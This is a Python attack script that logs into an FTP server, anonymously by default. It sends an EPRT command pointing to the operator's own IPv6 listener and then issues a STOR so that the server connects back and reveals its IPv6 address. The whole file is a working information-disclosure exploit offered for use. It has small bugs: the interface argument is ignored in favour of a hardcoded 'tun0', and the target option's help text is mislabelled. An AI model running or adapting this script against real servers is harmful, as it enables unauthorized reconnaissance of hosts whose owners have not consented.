#!/usr/bin/env python3
import socket
import os
import struct
import binascii
import subprocess
import sys
import string
import random
import threading
import time
import argparse

C_WHITE = '\033[1;37m'
C_BLUE = '\033[1;34m'
C_GREEN = '\033[1;32m'
C_YELLOW = '\033[1;33m'
C_RED = '\033[1;31m'
C_RESET = '\033[0m'

YELLOW_EX = C_YELLOW + "[!]" + C_RESET
RED_MINUS = C_RED + "[-]" + C_RESET
GREEN_PLUS = C_GREEN + "[+]" + C_RESET

def cleanUp(sock, filename):

    print(f"{GREEN_PLUS} Cleaning up . . .")
    delFile = f"DELE {filename}\r\n"
    sock.send(bytes(delFile, 'utf-8'))
    sock.recv(1024)
    os.system("rm -f " + filename)


def triggerLeak(sock, filename):

    print(f"{YELLOW_EX} Triggering Leak . . .")
    time.sleep(5)
    trigger = f"STOR {filename}\r\n"
    sock.send(bytes(trigger, 'utf-8'))
    sock.recv(1024)
    

    

def listenForLeak(ipv6, lport):

    print(f"{YELLOW_EX} Waiting for response that leaks the IPv6 . . . ")
    s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
    s.bind((ipv6, lport))
    s.listen()
    conn, addr = s.accept()
    with conn:
        remote_ipv6 = conn.getpeername()[0]
        print(f"{GREEN_PLUS} Success! Leaked IPv6 Address: {C_WHITE}{remote_ipv6}{C_RESET}")
        s.close()
        return None
        
    
    
def buildRandomFile():

    letters = string.ascii_lowercase
    fname = "." + ''.join(random.choice(letters) for i in range(random.randint(7,10)))

    with open(fname, "w") as f:
        f.write(fname)

    return fname

def getIP(interface):
   
    try: 
        ifconfig_out = subprocess.check_output(["ifconfig", "tun0"]).decode('utf-8').split("\n")
        for line in ifconfig_out:
            if "inet6" in line and "fe80" not in line:
                ipv6 = line.strip().split(" ")[1]
                return ipv6
    except:
        print(f"{RED_MINUS} Error obtaining IPv6 address of interface. Is ifconfig installed?")
        sys.exit(1)

        
def mainf(host, rport, user, passwd, ipv6):

    fname = buildRandomFile()
    lport = random.randint(60000,65534)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, rport))

    print(f"{YELLOW_EX} Authenticating . . .")
    s.recv(2048)
    sendUser = f"USER {user}\r\n"
    s.send(bytes(sendUser, 'utf-8'))

    s.recv(1024)
    sendPass = f"PASS {passwd}\r\n"
    s.send(bytes(sendPass, 'utf-8'))

    authCheck = s.recv(1024)
    if "530" in authCheck.decode('utf-8'):
        print(f"{RED_MINUS} Authentication Error. Please check credentials.")
        sys.exit(1)
    

    setEprt = f"EPRT |2|{ipv6}|{lport}|\r\n"
    s.send(bytes(setEprt, 'utf-8'))
    transferCheck = s.recv(1024)
    if "200-FXP transfer" not in transferCheck.decode('utf-8'):
        print(f"{RED_MINUS} Error performing FXP transfer. Are you sure its enabled?")
        sys.exit(1)

    threading.Thread(target=triggerLeak, args=(s,fname)).start()
    listenForLeak(ipv6, lport)
    cleanUp(s, fname)
    

if 1 == 1:
    parser = argparse.ArgumentParser(description="Leak the IPv6 address of a host using FXP RFC2428.")    
    parser.add_argument('-u', nargs='?', metavar='username', help='FTP Username.')
    parser.add_argument('-p', nargs='?', metavar='password', help='FTP Password.')
    parser.add_argument('-P', nargs='?', metavar='port', help="FTP Port.")
    parser.add_argument('-i', nargs='?', metavar='interface', help='The local interface to listen on.')
    parser.add_argument('-t', nargs='?', metavar='target', help="FTP Port.")
    args = parser.parse_args()

    if len(sys.argv) < 2:
        parser.print_help()
        sys.exit(0)

    if not args.t:
        print(f"{RED_MINUS} ERROR: Please specify a target with -t.")
        sys.exit(1)
    else:
        host = args.t


    if not args.i:
        print(f"{RED_MINUS} ERROR: You must specify a local interface.")
        sys.exit(1)
    else:
        ipv6  = getIP(args.i)


    if not args.u:
        print(f"{YELLOW_EX} No username specified. Using 'anonymous'.")
        username = "anonymous"
    else:
        username = args.u

    if not args.p:
        print(f"{YELLOW_EX} No password specified. Using ''.")
        password = ''
    else:
        password = args.p

    if not args.P:
        port = 21
    else:
        port = int(args.P)


    mainf(host, port, username, password, ipv6)
